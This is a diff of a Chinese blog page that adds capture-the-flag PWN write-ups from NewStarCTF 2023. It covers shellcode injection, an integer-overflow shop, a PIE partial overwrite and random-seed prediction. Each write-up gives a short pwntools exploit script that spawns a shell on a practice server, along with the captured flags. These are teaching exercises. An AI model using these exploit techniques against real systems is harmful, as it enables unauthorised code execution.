@@ -74,7 +74,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>525</span>
+    <span>3.3k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -82,7 +82,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
       <i class="ic i-clock"></i>
     </span>
     <span class="text">阅读时长</span>
-    <span>1 分钟</span>
+    <span>3 分钟</span>
   </span>
 </div>
 
@@ -115,12 +115,12 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/LsuOlHqJ23j69mA.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/kRgrDIqi4TdlhCY.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/YRDM7g9iLjzVOH2.jpg"></li>
           <li class="item" data-background-image="https://s2.loli.net/2023/10/06/DEqHBhTbMRJfOcY.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/LsuOlHqJ23j69mA.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/en2koGYgu7WUcEP.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/kRgrDIqi4TdlhCY.jpg"></li>
           <li class="item" data-background-image="https://s2.loli.net/2023/10/06/eWaFJo4tbACh7ur.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/uPcignyXZWBIEov.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/10/06/YRDM7g9iLjzVOH2.jpg"></li>
         </ul>
       </div>
     </header>
@@ -173,6 +173,47 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <p>![image-20231005150527611](NewStarCTF 2023 公开赛道 PWN/image-20231005150527611.png)</p>
 <p>利用 python 编写，直接填充字符覆盖返回地址为后门函数的地址即可</p>
 <figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25575</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"magic\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>backdoor <span class="token operator">=</span> <span class="token number">0x4011FB</span></pre></td></tr><tr><td data-num="5"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>  <span class="token comment">#p64 (0) 是为了覆盖掉 ebp</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>![image-20231005131606898](NewStarCTF 2023 公开赛道 PWN/image-20231005131606898.png)</p>
+<h3 id="ezshellcode"><a class="markdownIt-Anchor" href="#ezshellcode">#</a> ezshellcode</h3>
+<p><strong>考点：shellcode</strong></p>
+<p>打开题目，在 IDA 中进行查看 main 函数：</p>
+<p>![image-20231007155118707](NewStarCTF 2023 公开赛道 PWN/image-20231007155118707.png)</p>
+<p>buf 被分配了 1000 字节的空间，起始地址为  <code>0x66660000</code></p>
+<p>最后一行  <code>JUMPOUT</code>  直接跳转到  <code>0x66660000</code>  地址并开始运行。题目会执行我们发送的字符，直接用 pwntools 库生成 shellcode 发送即可</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27833</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"magic\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>![image-20231007155312386](NewStarCTF 2023 公开赛道 PWN/image-20231007155312386.png)</p>
+<p>得到 flag： <code>flag&#123;c67dd0d3-522f-49fd-8f7e-b073f471cd9c&#125;</code></p>
+<h3 id="newstar-shop"><a class="markdownIt-Anchor" href="#newstar-shop">#</a> newstar shop</h3>
+<p><strong>考点：整数溢出</strong></p>
+<p>查看文件的安全保护，发现全开了，不过没关系，本题考查的是整数溢出。</p>
+<p>![image-20231007160826985](NewStarCTF 2023 公开赛道 PWN/image-20231007160826985.png)</p>
+<p>查看源码可以发现，在商店中购买物品会扣除钱，money 初始化为 64h，即 100 元，shop 中一共可以划掉 60：</p>
+<p>![image-20231007161011266](NewStarCTF 2023 公开赛道 PWN/image-20231007161011266.png)</p>
+<p>剩下的一个需要去 dont_try 中去花掉，点击会 - 50。在商店中购买时会检查你的钱够不够，不够是没办法购买的，所以最后使钱小于 0 这一步只能在第三个 dont_try 中花掉。</p>
+<p>代码如下：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28951</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#花掉 40</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">#花掉 20</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#花掉 50</span></pre></td></tr><tr><td data-num="16"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment"># 购买 shell</span></pre></td></tr><tr><td data-num="19"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>获取 flag 如下：</p>
+<p>![image-20231007162007829](NewStarCTF 2023 公开赛道 PWN/image-20231007162007829.png)</p>
+<p><code>flag&#123;cf39380f-910a-4125-a91b-21bf1b9f3eec&#125;</code></p>
+<h3 id="p1eee"><a class="markdownIt-Anchor" href="#p1eee">#</a> p1eee</h3>
+<p><strong>考点：pie，partial overwrite</strong></p>
+<p>进入题目，打开 IDA ，找到后门函数：</p>
+<p>![image-20231007211944489](NewStarCTF 2023 公开赛道 PWN/image-20231007211944489.png)</p>
+<p>![image-20231007212111886](NewStarCTF 2023 公开赛道 PWN/image-20231007212111886.png)</p>
+<p>我们可以发现，溢出位置应该发生在 120E 函数中：</p>
+<p>![image-20231007212314466](NewStarCTF 2023 公开赛道 PWN/image-20231007212314466.png)</p>
+<p>我们再看 main 函数，可以发现其调用了 120E 函数，并且，最后 120E 函数的返回地址应该是 1297：</p>
+<p>![image-20231007213111787](NewStarCTF 2023 公开赛道 PWN/image-20231007213111787.png)</p>
+<p>和我们的后门函数的起始地址 1264 只差了 最后两个 16 进制数，也就是 1 字节的差距。虽然由于开了 PIE，基地址是不确定的，但是由于基地址最低 3 个 16 进制位为 0，所以低 3 位的偏移还是可以确定的。再看我们的 120E 函数，可以看到，buf 的空间范围是 0~-20，就是 20 个字节，再加上需要覆盖掉 ebp 的 8 字节，一共 28 字节，但是 read 读入了 29 字节，所以刚好多出一个字节供我们使用。</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29292</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token string">b'\x6c'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>![image-20231008135313847](NewStarCTF 2023 公开赛道 PWN/image-20231008135313847.png)</p>
+<p>得到 flag： <code>flag&#123;c9278352-5086-413f-99a8-034a7e2a1300&#125;</code></p>
+<h3 id="random"><a class="markdownIt-Anchor" href="#random">#</a> Random</h3>
+<p><strong>考点</strong>：<strong>ctypes，pwntools</strong></p>
+<p>打开题目查看安全信息：全开了…</p>
+<p>![image-20231008135534154](NewStarCTF 2023 公开赛道 PWN/image-20231008135534154.png)</p>
+<p>这一题看大佬的说法是：利用 ctypes 库在 python 代码中调用 c 语言函数，可以与程序生成同样的伪随机数。</p>
+<pre><code>由于远程那边启动和本地加载libc有一定时间差，我在远程连接后本地获取的time0返回值减了1，然后就rand（）获取随机数发送就行了。
+
+只能说还是有一定运气成分的，有时候不一定能随机到$0，我是大概试个两三次就可以了。
+</code></pre>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>dll <span class="token operator">=</span> CDLL<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#io = process('./random')</span></pre></td></tr><tr><td data-num="6"></td><td><pre>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29115</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>seed <span class="token operator">=</span> dll<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span></pre></td></tr><tr><td data-num="8"></td><td><pre>dll<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number?'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>dll<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>![image-20231008142330615](NewStarCTF 2023 公开赛道 PWN/image-20231008142330615.png)</p>
 
   </div>
 
@@ -184,7 +225,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-10-05 17:00:38" itemprop="dateModified" datetime="2023-10-05T17:00:38+08:00">2023-10-05</time>
+    <time title="修改时间：2023-10-08 14:26:03" itemprop="dateModified" datetime="2023-10-08T14:26:03+08:00">2023-10-08</time>
   </span>
 </div>
 
@@ -239,7 +280,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
     <div class="item left">
       
 
-  <a href="/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;10&#x2F;06&#x2F;LsuOlHqJ23j69mA.jpg" title="NewStarCTF 2023 公开赛道 WEB题目">
+  <a href="/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;10&#x2F;06&#x2F;kRgrDIqi4TdlhCY.jpg" title="NewStarCTF 2023 公开赛道 WEB题目">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>NewStarCTF 2023 公开赛道 WEB题目</h3>
@@ -249,7 +290,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
     <div class="item right">
       
 
-  <a href="/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;10&#x2F;06&#x2F;DEqHBhTbMRJfOcY.jpg" title="IDA 使用">
+  <a href="/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;10&#x2F;06&#x2F;eWaFJo4tbACh7ur.jpg" title="IDA 使用">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>IDA 使用</h3>
@@ -271,7 +312,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#newstarctf-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-pwn"><span class="toc-number">1.</span> <span class="toc-text"> NewStarCTF 2023 公开赛道 PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">1.1.</span> <span class="toc-text"> ret2text</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#newstarctf-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-pwn"><span class="toc-number">1.</span> <span class="toc-text"> NewStarCTF 2023 公开赛道 PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">1.1.</span> <span class="toc-text"> ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezshellcode"><span class="toc-number">1.2.</span> <span class="toc-text"> ezshellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#newstar-shop"><span class="toc-number">1.3.</span> <span class="toc-text"> newstar shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#p1eee"><span class="toc-number">1.4.</span> <span class="toc-text"> p1eee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-number">1.5.</span> <span class="toc-text"> Random</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
       </div>
@@ -286,7 +327,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">10</span>
+        <span class="count">14</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -376,24 +417,6 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/" title="NewStarCTF 2023 公开赛道 MISC">NewStarCTF 2023 公开赛道 MISC</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" title="目录遍历">目录遍历</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
     <span><a href="/2023/09/18/hello-world/" title="Hello World">Hello World</a></span>
   </li>
 
@@ -403,16 +426,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/10/01/BUUCTF%E2%80%94BABYRSA/" title="NewStarCTF 2023 公开赛道 Crypto题目">NewStarCTF 2023 公开赛道 Crypto题目</a></span>
+    <span><a href="/2023/10/08/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20RE/" title="NewStarCTF 2023 公开赛道 RE题目">NewStarCTF 2023 公开赛道 RE题目</a></span>
   </li>
 
       
@@ -422,6 +436,24 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 </div>
 
     <span><a href="/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/" title="WEB响应包源代码">WEB响应包源代码</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/10/01/BUUCTF%E2%80%94BABYRSA/" title="NewStarCTF 2023 公开赛道 Crypto题目 week1">NewStarCTF 2023 公开赛道 Crypto题目 week1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/10/16/10.06%20SUS%E5%9F%B9%E8%AE%AD/" title="10.06 SUS培训">10.06 SUS培训</a></span>
   </li>
 
       
@@ -448,7 +480,16 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/" title="斯坦福编程范式CS107_2">斯坦福编程范式CS107_2</a></span>
+    <span><a href="/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/" title="NewStarCTF 2023 公开赛道 MISC">NewStarCTF 2023 公开赛道 MISC</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a></span>
   </li>
 
   </ul>
@@ -473,13 +514,13 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">23k 字</span>
+    <span title="站点总字数">63k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">21 分钟</span>
+    <span title="站点阅读时长">58 分钟</span>
   </div>
   <div class="powered-by">
     基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
